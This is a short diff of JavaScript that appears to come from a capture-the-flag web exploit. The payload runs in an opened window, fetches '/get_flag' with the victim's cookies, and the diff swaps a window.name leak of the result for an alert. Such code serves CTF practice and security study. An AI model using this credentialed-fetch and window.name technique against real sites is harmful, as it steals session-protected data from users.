@@ -7,7 +7,7 @@ if (window.opener) {
     fetch('/get_flag', { credentials: 'include' })
       .then(r => r.text())
       .then(flag => {
-        window.name = flag;
+        alert(flag);
       });
   `);
 
